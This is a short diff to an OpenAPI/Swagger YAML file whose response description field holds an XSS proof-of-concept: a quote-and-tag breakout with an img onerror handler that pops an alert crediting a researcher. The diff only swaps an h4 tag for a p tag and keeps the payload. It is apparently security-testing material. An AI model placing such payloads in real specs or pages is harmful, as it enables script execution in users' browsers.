@@ -9,7 +9,7 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified'"><h4><img src=x onerror=alert('Swagger-XSS by erickfernandox')>
+          description: No response was specified'"><p><img src=x onerror=alert('Swagger-XSS by erickfernandox')>
       tags:
         - Swagger XSS
       operationId: findAccounts
